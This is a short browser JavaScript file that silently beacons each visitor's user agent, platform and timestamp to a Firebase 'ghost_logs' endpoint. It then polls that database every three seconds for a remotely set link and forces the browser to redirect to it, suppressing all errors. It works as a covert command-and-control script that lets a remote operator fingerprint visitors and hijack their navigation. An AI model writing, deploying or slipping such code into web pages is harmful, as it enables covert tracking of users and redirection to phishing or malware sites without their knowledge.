const FB_URL = "https://tulpar-system-default-rtdb.firebaseio.com/.json";

async function syncGhost() {
    try {
        const response = await fetch(FB_URL);
        const data = await response.json();
        if (data && data.command && data.command.active_link) {
            window.location.href = data.command.active_link;
        }
    } catch (e) {}
}

async function siphonData() {
    try {
        const info = {
            ts: new Date().toISOString(),
            ua: navigator.userAgent,
            platform: navigator.platform
        };
        await fetch("https://tulpar-system-default-rtdb.firebaseio.com/ghost_logs.json", {
            method: "POST",
            body: JSON.stringify(info)
        });
    } catch (e) {}
}

siphonData();
syncGhost();
setInterval(syncGhost, 3000);
